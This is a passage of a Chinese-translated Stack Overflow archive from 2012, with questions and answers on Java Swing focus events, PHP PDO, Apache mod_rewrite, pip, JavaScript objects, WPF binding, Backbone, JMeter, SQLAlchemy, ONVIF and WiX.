    JPanel panel = new JPanel();
    panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));

    JTextField text1 = new JTextField();
    text1.setName("text1");
    text1.addFocusListener(this);

    JTextField text2 = new JTextField();
    text2.setName("text2");
    text2.addFocusListener(this);

    panel.add(new JLabel("tex1"));
    panel.add(text1);

    panel.add(new JLabel("text2"));
    panel.add(text2);

    frame.setContentPane(panel);
    frame.pack();
    frame.setVisible(true);
}

public static void main(String [] args)
{
    ShortTest test = new ShortTest();
    test.go();
}

@Override
public void focusGained(FocusEvent e)
{
    if (!e.isTemporary() && (e.getSource() instanceof JTextField))
    {
        System.out.println("Focus Gained: " + ((JTextField)e.getSource()).getName());
    }
}

@Override
public void focusLost(FocusEvent e)
{
    if (!e.isTemporary() && (e.getSource() instanceof JTextField))
    {
        JOptionPane.showOptionDialog(null, ((JTextField)e.getSource()).getName() + " lost focus", "Title", JOptionPane.DEFAULT_OPTION, 0, null, null, null);
    }
}
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T22:11:19.653

也许您想要的不是焦点侦听器（非常低级的构造），而是输入验证器（更高级别的构造）。这应该在焦点转移之前做出响应。例如，在下面的代码中，如果用户尝试在文本字段中输入非数字数据，验证器会做出反应。是的，这也可以使用 DocumentFilter 来完成。

```
import javax.swing.*;

public class VerifierEg extends JPanel {
   private static final int FIELD_COUNT = 3;

   public VerifierEg() {
      InputVerifier inputVerifier = new InputVerifier() {

         @Override
         public boolean verify(JComponent input) {
            final JTextField textField = (JTextField) input;
            String text = textField.getText();
            for (char c : text.toCharArray()) {
               if (!Character.isDigit(c)) {
                  textField.setText("");
                  JOptionPane.showMessageDialog(VerifierEg.this, "Text: \""
                        + text + "\" must hold only digits", "Text Field Error",
                        JOptionPane.ERROR_MESSAGE);
                  return false;
               }
            }
            return true;
         }
      };
      for (int i = 0; i < FIELD_COUNT; i++) {
         JTextField field = new JTextField(6);

         field.setInputVerifier(inputVerifier);
         add(field);
      }
   }

   private static void createAndShowGui() {
      JFrame frame = new JFrame("Enter Numbers");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(new VerifierEg());
      frame.pack();
      frame.setLocationRelativeTo(null);
      frame.setVisible(true);
   }

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }
} 
```

编辑：
InputVerifier 可以用于您的目的，即使您没有以任何特定方式验证输入。例如，要修改您的代码：

```
import java.awt.event.FocusEvent;
import java.awt.event.FocusListener;
import javax.swing.BoxLayout;
import javax.swing.InputVerifier;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTextField;

public class ShortTest2 {
   private void go() {
      final JFrame frame = new JFrame();
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

      JPanel panel = new JPanel();
      panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));

      InputVerifier inputVerifier = new InputVerifier() {

         @Override
         public boolean verify(JComponent input) {
            JOptionPane.showMessageDialog(frame,
                  "Focus Lost on " + input.getName());
            return true;
         }
      };

      FocusListener focusListener = new FocusListener() {

         @Override
         public void focusLost(FocusEvent e) {
            String name = ((JComponent)e.getSource()).getName();
            System.out.println("Focus Lost: " + name );
         }

         @Override
         public void focusGained(FocusEvent e) {
            String name = ((JComponent)e.getSource()).getName();
            System.out.println("Focus Gained: " + name );
         }
      };

      JTextField[] textFields = new JTextField[2];
      for (int i = 0; i < textFields.length; i++) {
         JTextField textField = new JTextField(10);
         String name = "text " + (i + 1);
         textField.setName(name);
         textField.setInputVerifier(inputVerifier);
         textField.addFocusListener(focusListener);

         panel.add(new JLabel(name));
         panel.add(textField);         
      }

      frame.setContentPane(panel);
      frame.pack();
      frame.setVisible(true);
   }

   public static void main(String[] args) {
      ShortTest2 test = new ShortTest2();
      test.go();
   }
} 
```

顺便说一下，为您的 SSCCE 获得 1+！

# php - 致命错误：在非对象 PDO PHP 类上调用成员函数 prepare()

> ID：11091458
> 
> 赞同：-1
> 
> 时间：2012-06-18T21:36:43.190
> 
> 标签：php, mysql, pdo

所以我正在编写一个名为 article 的 PHP 类，它有很多方法，如插入、删除和更新。我有 3 个其他函数遵循相同的代码，它们都可以工作，所以我不知道为什么会出现这个错误。这是我写的代码。

```
public function update(){

    //make sure that the article does have an I.D
    if(is_null($this->id)) trigger_error("Article::update(): Attempt to update an Article object that does not have its ID property set.", E_USER_ERROR );

    //If there are any PDO errors they will be caught.
    try{
        $connection1 = new PDO(DB_DSN, DB_USERNAME, DB_PASSWORD);
        $connection1->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
        $sqlQuery = "UPDATE articles SET lastEditDate=FROM_UNIXTIME(:lastEditDate), lastEditUser=:lastEditUser, title=:title, content=:content WHERE id = :id";
        $statement->prepare($sqlQuery);
        $statement->bindValue(":lastEditDate", $this->lastEditDate, PDO::PARAM_INT);
        $statement->bindValue(":lastEditUser", $this->lastEditUser, PDO::PARAM_STR);
        $statement->bindValue(":title", $this->title, PDO::PARAM_STR);
        $statement->bindValue(":content", $this->content, PDO::PARAM_STR);
        $statement->bindValue(":id", $this->id, PDO::PARAM_INT);
        $statement->execute();
        $connection1 = null;

    }

    catch(PDOException $e){
        echo "update():I'm sorry, Dave. I'm afraid I can't do that.";  
        file_put_contents('PDOErrors.txt', $e->getMessage(), FILE_APPEND);
    }

} 
```

我读到你可以从以前的查询中得到它，所以我尝试重命名并将一堆变量设置为空。我还检查了我可以从该站点和其他站点找到的其他线程，几乎所有这些线程都是范围问题，我认为这不是问题，因为我的所有其他功能都可以工作。有什么明显的痛苦我想念的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:38:18.967

应该是`$connection1->prepare()`，不是`$statement->prepare()`。

# apache - .htaccess 中的 WAMP Apache 重写问题

> ID：11091464
> 
> 赞同：1
> 
> 时间：2012-06-18T21:37:06.947
> 
> 标签：apache, .htaccess, mod-rewrite, wamp

我在 WAMP 环境中工作，试图创建一个简单的前端控制器，并开始在我的项目根目录中创建一个 .htaccess 文件（即 www/molecule/ .htaccess 包含：

```
Options +FollowSymLinks
IndexIgnore */*
# Turn on the RewriteEngine
RewriteEngine On
#  Rules
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php 
```

Apache rewrite_module 在我的 WAMP 设置中启用，并且在 httpd.conf 中也未注释，但是当我尝试在目录中加载具有该 .htaccess 的任何页面时出现内部服务器错误。Apache 错误日志显示：

```
[alert] [client 127.0.0.1] C:/wamp/www/molecule/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration 
```

有人可以指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-18T22:27:06.203

看起来你没有打开你的 mod_rewrite 模块。找到您的 httpd.conf 文件并搜索`mod_rewrite`，该行应如下所示：

```
LoadModule rewrite_module modules/mod_rewrite.so 
```

确保通过删除`#`它前面的来取消注释。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-10-23T15:11:04.390

[如果它与托管站点有关，请询问您的托管公司，或者如果您想在 wamp 本地机器中启用它，然后检查这个与在 wamp apache https://youtu.be/xIspOX9FuVU](https://youtu.be/xIspOX9FuVU?t=1m43s) 中启用重写模块相关的 youtube 分步教程 ？ [t=1m43s Wamp](https://youtu.be/xIspOX9FuVU?t=1m43s)
server icon -> Apache -> Apache Modules 并检查 rewrite module 选项它应该被检查，但之后重新启动 wamp 中的所有服务

# python - pip --find-links 选项似乎不起作用

> ID：11091470
> 
> 赞同：5
> 
> 时间：2012-06-18T21:38:05.707
> 
> 标签：python, installation, pip

尝试从 pip 安装时

```
$ pip install Django==1.4 
```

我很可能得到

> [获取http://pypi.python.org/packages/source/D/Django/Django-1.4.tar.gz#md5=ba8e86198a93c196015df0b363ab1109](http://pypi.python.org/packages/source/D/Django/Django-1.4.tar.gz#md5=ba8e86198a93c196015df0b363ab1109)时出错 （来自[http://pypi.python.org/simple/Django/](http://pypi.python.org/simple/Django/)）

根据 Jacob[在他的博客中的](http://jacobian.org/writing/when-pypi-goes-down/)建议，我添加了`--use-mirrors`但没有运气。对此博客发表的几条评论指出，他们自己托管文件。所以我将 tar.gz 文件托管到 example.com/packages 目录。

下面的命令成功安装 Django 1.4

```
$ pip install https://example.com/packages/Django-1.4.tar.gz 
```

下面的命令似乎不起作用，想找出我做错了什么。

```
$ pip install --find-links=https://example.com/packages/ Django==1.4
$ pip install --find-links "https://example.com/packages/" Django==1.4
$ pip install -f https://example.com/packages/ Django==1.4 
```

导致：

> 下载/解包 Django==1.4 获取 [http://pypi.python.org/packages/source/D/Django/Django-1.4.tar.gz#md5=ba8e86198a93c196015df0b363ab1109](http://pypi.python.org/packages/source/D/Django/Django-1.4.tar.gz#md5=ba8e86198a93c196015df0b363ab1109)时出错 （来自[http://pypi.python.org /简单/Django/](http://pypi.python.org/simple/Django/) )

不确定为什么它似乎忽略了 --find-links 选项 Apache 自动索引已为 Packages 目录启用，因此将浏览器指向[https://example.com](https://example.com)将返回 tar.gz 文件列表

任何建议都会被采纳

# javascript - JavaScript 中更高效的选项对象

> ID：11091476
> 
> 赞同：0
> 
> 时间：2012-06-18T21:38:25.067
> 
> 标签：javascript, json

我目前在页面加载时使用所有可能的键/值对创建一个对象，并使用 true 或 false 来确定它们的状态。如果只有真实的项目存在，那会更有效率。

样本数据：

```
 filter =  {
            "country": 1,
            "Age Group": {
                2: false,
                3: true,
                4: false,
                5: false,
                6: false,
                7: false
            },
            "Gender": {
                1: false,
                2: false
            },
            "NEWSEC": {
                1: false,
                2: true,
                3: false,
                4: false,
                5: false
            },
            "Telco_Segment": {
                1: true,
                2: true,
                3: true,
                4: false,
                5: false,
                6: false
            }
    }; 
```

功能：

```
function facetBuilder(key, val)
{
    if(key == 'country')
    {   
        filter.country = val;
    }
    else
    {
        if( filter[key][val] == true )
        {
            filter[key][val] = false;
        }
        else
        {
            filter[key][val] = true;
        }
    }
    console.log(filter);
} 
```

问题：

我用来应用这些过滤器的函数会循环遍历它们，因此如果我只存在诸如“年龄组”之类的对象（如果它包含任何值）会更有益。事实上，有这样的东西会很好：

```
 filter =  {
            "country": 1,
            "Age Group": [3],
            "NEWSEC": [2],
            "Telco_Segment": [1,2,3]
    }; 
```

调用 facetBuilder 基本上会根据该对象的值的存在来添加/删除该对象。

我对如何处理这个问题一无所知。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:46:56.317

您不需要明确检查`true`. 您可以通过执行以下操作来检查条目是否存在：

```
if(map[key]) {
  ...
  ...
} 
```

但是，如果与该键关联的值是`0`，那么这是一个问题，所以最好这样做：

```
if(typeof map[key] !== "undefined") {
   ...
   ...
} 
```

您想`typeof`在这种情况下使用的原因是直接比较`undefined`可能会出现问题，因为它可能会`undefined`被其他代码覆盖：

```
window.undefined = "not undefined";
"not undefined" == "undefined" //returns a true value 
```

然后您的代码将如下所示：

```
if(typeof filter[key][val] !== "undefined" )
{
    delete filter[key][val]; //I'm assuming you want to remove it
}
else
{
    filter[key][val] = true;
} 
```

另一件事，在检查真实值时，足以说明

```
if([expression that evaluates to a boolean value]) {
    ...
} 
```

您不必这样做：

```
if([expression that evaluates to a boolean value] == true) {
    ...
} 
```

或者

```
if([expression that evaluates to a boolean value] == false) {
    ...
} 
```

检查属性是否存在的另一种方法是使用`in`运算符：

```
var stuff = {
   a: 10,
   c: 20,
   d: 30
};

var ay = "a"
console.log(ay in blab, "b" in blab, "c" in blab, "d" in blab);
>>true false true true 
```

我假设这是你想要做的。如果没有，请告诉我。

# wpf - 如何在 ItemsControl 中绑定 CheckBox 的 IsChecked 属性？

> ID：11091482
> 
> 赞同：0
> 
> 时间：2012-06-18T21:39:01.130
> 
> 标签：wpf, binding, checkbox, itemscontrol

我有以下 ItemsControl，它为可用集合中的每个数据库提供了一个复选框。这些复选框允许用户选择要过滤的复选框。要过滤的数据库位于单独的集合 (FilteredDatabases) 中。我该怎么做？我可以将 InFilter 属性添加到数据库项类。但是，我还不想开始更改此代码。我无法解决的问题是我需要绑定到不在数据库项本身上的属性。有任何想法吗？

```
<ItemsControl ItemsSource="{Binding AvailableDatabases}">
   <ItemsControl.ItemTemplate>
      <DataTemplate>
         <CheckBox Content="{Binding Name}" IsChecked="{Binding ???}"/>
      </DataTemplate>
   </ItemsControl.ItemTemplate>
</ItemsControl>

// In view model

public IBindingList FilteredDatabases
{
  get;
  private set;  
}

public IBindingList AvailableDatabases
{
   get;
   private set;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T18:48:11.663

以下代码说明了您正在尝试做什么，为了做到这一点，您最好使用 ObservableCollection 而不是作为您的集合对象，如果 ItemsControl 绑定到它，它会在添加和删除视图模型时自动更新 UI。

XAML：

```
<Grid>
    <Grid.ColumnDefinitions>
        <ColumnDefinition />
        <ColumnDefinition />
    </Grid.ColumnDefinitions>
    <ItemsControl Grid.Column="0" ItemsSource="{Binding AvailableDatabases}">
        <ItemsControl.ItemTemplate>
            <DataTemplate>
                <CheckBox Content="{Binding Name}" IsChecked="{Binding IsChecked}"/>
            </DataTemplate>
        </ItemsControl.ItemTemplate>
    </ItemsControl>
    <ItemsControl Grid.Column="1" ItemsSource="{Binding FilteredDatabases}">
        <ItemsControl.ItemTemplate>
            <DataTemplate>
                <TextBlock Text="{Binding Name}" />
            </DataTemplate>
        </ItemsControl.ItemTemplate>
    </ItemsControl>
</Grid> 
```

查看型号：

```
public class MainViewModel
{
    private ObservableCollection<DBViewModel> _availableDatabases;
    private ObservableCollection<DBViewModel> _filteredDatabases;

    public ObservableCollection<DBViewModel> AvailableDatabases
    {
        get
        {
            if (_availableDatabases == null)
            {
                _availableDatabases = new ObservableCollection<DBViewModel>(new List<DBViewModel>()
                    {
                        new DBViewModel(this) { Name = "DB1" , IsChecked = true},
                        new DBViewModel(this) { Name = "DB2" },
                        new DBViewModel(this) { Name = "DB3" },
                        new DBViewModel(this) { Name = "DB4" },
                        new DBViewModel(this) { Name = "DB5" },
                        new DBViewModel(this) { Name = "DB6" },
                        new DBViewModel(this) { Name = "DB7" , IsChecked = true },
                    });

            }
            return this._availableDatabases;
        }
    }

    public ObservableCollection<DBViewModel> FilteredDatabases
    {
        get
        {
            if (_filteredDatabases == null)
                _filteredDatabases = new ObservableCollection<DBViewModel>(new List<DBViewModel>());

            return this._filteredDatabases;
        }
    }
}

public class DBViewModel
{
    private MainViewModel _parentVM;
    private bool _isChecked;

    public string Name { get; set; }

    public DBViewModel(MainViewModel _parentVM)
    {
        this._parentVM = _parentVM;
    }

    public bool IsChecked
    {
        get
        {
            return this._isChecked;
        }
        set
        {
            //This is called when checkbox state is changed
            this._isChecked = value;

            //Add or remove from collection on parent VM, perform sorting here
            if (this.IsChecked)
                _parentVM.FilteredDatabases.Add(this);
            else
                _parentVM.FilteredDatabases.Remove(this);

        }
    }
} 
```

视图模型也应该实现 INotifyPropertyChanged，我省略了它，因为在这种特殊情况下没有必要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T00:23:58.070

1.  将 CheckBox.Command 绑定到路由命令实例
2.  将路由命令绑定到方法
3.  使用 IBindingList.Add 和 IBindingList.Remove 方法

# backbone.js - 在 Backbone 中设置父属性的正确方法是什么？

> ID：11091485
> 
> 赞同：2
> 
> 时间：2012-06-18T21:39:11.227
> 
> 标签：backbone.js

我有一个 JSON 文件，它将创建我`ParentModel`的以及填充子集合`Records`。

```
ParentModel : Backbone.Model.extend({
  initialize: function() {
    this.set({ records: new Records(this.get("records")) });
  }
}); 
```

Records 集合只是映射到 Record 模型的基本 Backbone 集合。

问题是我需要孩子知道父母，所以每个`Record`模型都必须有一个父属性。所以现在我刚刚将它添加到初始化方法的底部：

```
var self = this;
this.get("records").each(function(record) {
  record.set("parent", self);
}); 
```

这很好用，但是当我创建新记录时，我宁愿不必记住包含这 4 行。

[这个答案](https://stackoverflow.com/a/10399476/74022)说我可以重写初始化方法以接受额外的参数，但我不太确定如何让 Backbone 自动将 ParentModel 传递给重写的初始化方法。谁能提供一个如何做到这一点的例子？

我听说过[Backbone-relational](https://github.com/PaulUithol/Backbone-relational)可能有助于做我想做的事，但这是另外 23kb 的内容。如果这是更好的方法，我会考虑实现它，但如果有可用的解决方案，我更喜欢更简单的解决方案。

`ParentModel`无论我是通过代码创建新记录，还是它是由 JSON 提要自动创建的，这都需要工作。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-10T16:21:07.443

我通常发现将结构元素移出属性更清晰，因此我的记录和父属性位于对象上，而不是属性上。也就是说，您可以利用集合和父对象上的不同事件：

```
var ParentModel = Backbone.Model.extend({
    initialize: function () {
        _.bindAll(this, 'adoptOne', 'adoptAll');
        this.records = new Records();

        this.on('change:records', function () {
             this.records.reset(this.get('records'));
        });
        this.records.on('reset', this.adoptAll);
        this.records.on('add', this.adoptOne);

        this.records.reset(this.get('records'));
    },

    adoptAll: function () {
       this.records.each(this.adoptOne);
    },
    adoptOne: function (model) {
        model.parent = this;
    }
}); 
```

一些测试：

```
var p = new ParentModel({
    name: "I am the parent",
    records: [{id: 1}, {id: 2}]
});

p.records.add({id: 3});

p.records.each(function (child) {
    console.log(child.get('id')+' '+child.parent.get('name'));
});

p.set({records: [{id: 4}]});

p.records.each(function (child) {
    console.log(child.get('id')+' '+child.parent.get('name'));
}); 
```

还有一个小提琴[http://jsfiddle.net/sPXaZ/](http://jsfiddle.net/sPXaZ/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-12T08:00:19.177

为了清楚起见，这里是您的需求之一的摘要（*可以在问题评论中找到*）：

> 例如，如果我想居中定位一个 Record 元素，我需要知道 viewbox 的宽度。知道这一点的唯一方法是知道最宽的记录元素是什么。父对象可以通过对其子元素进行排序来告诉我这一点。

在我看来，您的模型必须处理显示问题；Backbone 中的显示由 Views 处理。所以，我想你可以创建一个既听又听的`ParentModel`视图`Records`。

```
var RecordView = Backbone.View.extend({
  initialize: function() {
    this.collection.on('sync', this.render, this);
  }
  render: function() {
    var widest = this.model.get('width');
  }
});

var view = new RecordView({model: ParentModel, collection: Records}); 
```

而且，在我看来，这不是为了`ParentModel`处理它在屏幕上的宽度，而是为了它自己的视图。在这里介绍两个 View 似乎是重点。

但我没有完整的图片，所以，如果我错了，请给我更多你想要做的事情的样本。

# java - 使用 Jmeter 测试消费者和生产者

> ID：11091487
> 
> 赞同：0
> 
> 时间：2012-06-18T21:39:16.897
> 
> 标签：java, jms, jmeter

我有两个程序，第一个是制作人：

```
public class Producer {
    public static void main(String[] args) throws Exception {
        final ConnectionFactory cf = new ActiveMQConnectionFactory("tcp://localhost:12345");
        final Connection c = cf.createConnection();
        final Session s = c.createSession(false, Session.AUTO_ACKNOWLEDGE);
        final TextMessage msg = s.createTextMessage("rho " + new Date().toString());
        final MessageProducer p = s.createProducer(new ActiveMQQueue("rmannibucau"));
        p.send(msg);
        p.close();
        s.close();
        c.close();
        }
} 
```

第二个是消费者：

```
public class Listener {
    public static void main(String[] args) throws Exception {
        final ConnectionFactory cf = new ActiveMQConnectionFactory("tcp://localhost:12345");
        final Connection c = cf.createConnection();
        final Session s = c.createSession(false, Session.AUTO_ACKNOWLEDGE);
        s.createConsumer(s.createQueue("rmannibucau")).setMessageListener(new MessageListener() {

        @Override
        public void onMessage(Message message) {
            System.out.println(message.toString());
        }
    });

    c.start();
    s.run();
    }
} 
```

我使用 ActiveMQ、java、jms，我想用 Jmetter 进行测试，以了解消费者在 1 分钟内可以消耗多少消息，请帮助我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:45:20.863

您将需要创建某种[自定义 Java 采样器。](http://jmeter.apache.org/api/org/apache/jmeter/protocol/java/sampler/AbstractJavaSamplerClient.html)创建其中之一时，您可以从内部调用您的代码，设置开始/结束计时器，如果请求成功/失败等。然后，您将此 jar 放入 JMeter，它将显示为 Java 采样器。从这里，您可以使用 JMeter 的所有功能来指定用户、请求、时间限制等。

我希望这足以帮助你。

# python - 将对象添加到 SQLAlchemy 关联对象时出现 KeyError

> ID：11091491
> 
> 赞同：11
> 
> 时间：2012-06-18T21:39:55.147
> 
> 标签：python, sqlalchemy

我有两张桌子，`tablet`并且`correspondent`：

```
class Correspondent(db.Model, GlyphMixin):
    # PK column and tablename etc. come from the mixin
    name = db.Column(db.String(100), nullable=False, unique=True)
    # association proxy
    tablets = association_proxy('correspondent_tablets', 'tablet')

    def __init__(self, name, tablets=None):
        self.name = name
        if tablets:
            self.tablets = tablets

class Tablet(db.Model, GlyphMixin):
    # PK column and tablename etc. come from the mixin
    area = db.Column(db.String(100), nullable=False, unique=True)
    # association proxy
    correspondents = association_proxy('tablet_correspondents', 'correspondent')

    def __init__(self, area, correspondents=None):
        self.area = area
        if correspondents:
            self.correspondents = correspondents

class Tablet_Correspondent(db.Model):

    __tablename__ = "tablet_correspondent"
    tablet_id = db.Column("tablet_id",
        db.Integer(), db.ForeignKey("tablet.id"), primary_key=True)
    correspondent_id = db.Column("correspondent_id",
        db.Integer(), db.ForeignKey("correspondent.id"), primary_key=True)
    # relations
    tablet = db.relationship(
        "Tablet",
        backref="tablet_correspondents",
        cascade="all, delete-orphan",
        single_parent=True)
    correspondent = db.relationship(
        "Correspondent",
        backref="correspondent_tablets",
        cascade="all, delete-orphan",
        single_parent=True)

    def __init__(self, tablet=None, correspondent=None):
        self.tablet = tablet
        self.correspondent = correspondent 
```

我可以将记录添加到`tablet`and `correspondent`，并且执行 eg`Tablet.query.first().correspondents`只是返回一个空列表，正如您所期望的那样。如果我使用现有的平板电脑和通讯员 ID 手动将一行插入到我的`tablet_correspondent`表中，则会再次填充列表，正如您所期望的那样。

但是，如果我尝试做

```
cor = Correspondent.query.first()
tab = Tablet.query.first()
tab.correspondents.append(cor) 
```

我得到：

```
KeyError: 'tablet_correspondents' 
```

我很确定我在这里遗漏了一些相当基本的东西。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-06-20T09:12:49.343

您的代码的**问题**在于`.__init__`方法。如果你`debug-watch/print()`对参数，你会注意到参数`tablet`实际上是一个实例`Correspondent`：

```
class Tablet_Correspondent(db.Model):
    def __init__(self, tablet=None, correspondent=None):
        print "in __init__: ", tablet, correspondent
        self.tablet = tablet
        self.correspondent = correspondent 
```

原因在于 SA 创造新价值的方式。来自文档[Creation of New Values](http://docs.sqlalchemy.org/en/latest/orm/extensions/associationproxy.html#creation-of-new-values)：

> 当关联代理拦截列表`append()`事件（或 set `add()`、 dictionary`__setitem__()`或标量赋值事件）时，它会使用其构造函数实例化“中间”对象的新实例，并将给定值作为单个参数传递。

在您调用的情况下`tab.correspondents.append(cor)`，`Tablet_Correspondent.__init__`使用单个参数调用`cor`。

**解决方案？**如果您只添加`Correspondents`到 中`Tablet`，那么只需切换 中的参数即可`__init__`。事实上，完全删除第二个参数。
但是，如果您也将使用`cor.tablets.append(tab)`，那么您需要明确使用 的`creator`参数，`association_proxy`如上面链接的文档中所述：

```
class Tablet(db.Model, GlyphMixin):
    # ...
    correspondents = association_proxy('tablet_correspondents', 'correspondent', creator=lambda cor: Tablet_Correspondent(correspondent=cor))

class Correspondent(db.Model, GlyphMixin):
    # ...
    tablets = association_proxy('correspondent_tablets', 'tablet', creator=lambda tab: Tablet_Correspondent(tablet=tab)) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-09T21:08:11.923

就像 van 说的，问题出在[Association Object](http://docs.sqlalchemy.org/en/rel_0_8/orm/extensions/associationproxy.html#simplifying-association-objects)`__init__`的方法上。

事实上，如果 Tablet 或 Correspondent 类不定义`__init__`方法或不传递任何参数，则解决方案不起作用（预期没有参数）。

我找到了一个替代解决方案。很容易检测必须代理哪个类，因此可以将其分配给正确的字段（并且仍在添加更多关联）：

```
class Tablet_Correspondent(db.Model):

    # ...

    def __init__(self, proxied=None):
        if type(proxied) is Tablet:
            self.tablet = proxied
        elif type(proxied) is Correspondent:
            self.correspondent = proxied 
```

# c# - 定义 DeviceClient(Bind, endPointAddress)

> ID：11091492
> 
> 赞同：0
> 
> 时间：2012-06-18T21:40:04.260
> 
> 标签：c#, wsdl, onvif

我正在尝试与**ONVIF**认证设备交互，例如能够访问简单的设备信息。

我一直在尝试使用另一个成员在此处提供的以下代码：

[.NET 4.0 中的 ONVIF 身份验证与 Visual Studios 2010](https://stackoverflow.com/questions/5638247/onvif-authentication-in-net-4-0-with-visual-studios-2010)

但是，我无法理解**DeviceClient**的功能是什么以及它的作用。我试图在**ONVIF WSDLs**和作为一个类上找到它，但无济于事。我对**C#**、**WSDLs**和**ONVIF**非常陌生，因此感谢任何帮助。

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-02-20T19:58:50.523

当我的代码无法识别`DeviceClient`和`MediaClient`分类时，我遇到了类似的问题。从 Hugo 的评论中，我得到了线索，并从我已经添加为 Web 引用的 C# 项目中删除了 OnVif 引用。然后简单地添加以下参考作为服务参考，它对我有用：

1.  [http://www.onvif.org/onvif/ver10/device/wsdl/devicemgmt.wsdl](http://www.onvif.org/onvif/ver10/device/wsdl/devicemgmt.wsdl)
2.  [http://www.onvif.org/onvif/ver10/media/wsdl/media.wsdl](http://www.onvif.org/onvif/ver10/media/wsdl/media.wsdl)

下面是我从 StackOverflow 上的另一篇文章中获取的工作代码片段。

```
ServicePointManager.Expect100Continue = false;
var endPointAddress = new EndpointAddress("http://" + cameraAddress + "/onvif/device_service");
var httpTransportBinding = new HttpTransportBindingElement { AuthenticationScheme = AuthenticationSchemes.Digest };
var textMessageEncodingBinding = new TextMessageEncodingBindingElement { MessageVersion = MessageVersion.CreateVersion(EnvelopeVersion.Soap12, AddressingVersion.None) };
var customBinding = new CustomBinding(textMessageEncodingBinding, httpTransportBinding);
var passwordDigestBehavior = new PasswordDigestBehavior(adminName, adminPassword);
var deviceClient = new DeviceClient(customBinding, endPointAddress);
deviceClient.Endpoint.Behaviors.Add(passwordDigestBehavior); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-08T12:12:08.370

我使用 vs2010 命令提示符将 devicemngmnt.wsdl 文件转换为 .cs 文件，但代码文件不包含“deviceclient”。
我还尝试将您的 xml 片段添加到 .wsdl 文件中，当我尝试使用 VS2010 命令提示符将 .wsdl 转换为 .cs 文件时，我收到此错误。

错误：无法从命名空间“ [http://www.onvif.org/ver10/device/wsdl](http://www.onvif.org/ver10/device/wsdl) ”导入绑定“DeviceBinding ”。

*   无法导入操作“GetServices”。

*   缺少数据类型“ [http://www.onvif.org/ver10/schema:OnvifVersion ”。](http://www.onvif.org/ver10/schema:OnvifVersion)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-21T20:19:52.830

在敲了几次头之后，我终于意识到了我的问题。

我必须以以下格式向 wsdl 添加服务：

```
 <wsdl:service name="DeviceService">
     <wsdl:port name="DevicePort" binding="tds:DeviceBinding">
       <soap:address location="http://ip/onvif/device_service"/>
     </wsdl:port>
   </wsdl:service> 
```

之后，只需将其作为服务引用而不是 Web 引用添加到项目中。之后，该库获取了 DeviceClient(Bind, endPoint) 引用。

希望这可以帮助人们。

# wix - WIX CustomAction 加载 CLR 4.0 而不是 2.0

> ID：11091493
> 
> 赞同：3
> 
> 时间：2012-06-18T21:40:11.477
> 
> 标签：wix, custom-action, dtf

我正在尝试编写 ac# 自定义操作并使用 .Net 2，但是我似乎无法让事情正常工作。我相信 MSI 使用了错误的 CLR 版本。我在日志文件上方的几行中看到了这一点，MSI 正在调用我的 CA（如果我注释掉我的 CA，则不会出现行）：

```
SFXCA: Binding to CLR version v4.0.30319\. 
```

我的自定义操作似乎没有加载（假设因为我没有看到任何日志消息）。我正在使用 Wiz 3.6.3014.0。这是否受支持，或者 Windows 安装程序是否仅使用机器上可用的最新运行时？

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-18T23:37:46.337

当您使用 WiX 创建 C# 自定义操作项目时，默认情况下会创建一个名为 CustomAction.config 的 XML 文件。此文件的目的是指示 sfxca.dll 在运行代码时使用哪个版本的 CLR。该文件的默认实现如下所示：

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup useLegacyV2RuntimeActivationPolicy="true">

        <!--
          Use supportedRuntime tags to explicitly specify the version(s) of the .NET Framework runtime that
          the custom action should run on. If no versions are specified, the chosen version of the runtime
          will be the "best" match to what Microsoft.Deployment.WindowsInstaller.dll was built against.

          WARNING: leaving the version unspecified is dangerous as it introduces a risk of compatibility
          problems with future versions of the .NET Framework runtime. It is highly recommended that you specify
          only the version(s) of the .NET Framework runtime that you have tested against.

          Note for .NET Framework v3.0 and v3.5, the runtime version is still v2.0.

          In order to enable .NET Framework version 2.0 runtime activation policy, which is to load all assemblies 
          by using the latest supported runtime, @useLegacyV2RuntimeActivationPolicy="true".

          For more information, see http://msdn.microsoft.com/en-us/library/bbx34a2h.aspx
        -->

        <supportedRuntime version="v4.0" />
        <supportedRuntime version="v2.0.50727"/>

    </startup>

    <!--
      Add additional configuration settings here. For more information on application config files,
      see http://msdn.microsoft.com/en-us/library/kza1yk3a.aspx
    -->

</configuration> 
```

基本上，允许用 .NET 2.0/3.0/3.5（所有 CLR 2.0）编写的 CA 对 4.0 运行是一个很好的做法，因为您可能会遇到仅安装了 4.0 的机器。一般来说，您的代码应该适用于 4.0，如果不适用，我会修复它。

或者，您可以更新配置文件以仅允许在 2.0 上运行，然后将所需的检查放入安装程序以确保实际安装了此版本的 CLR。

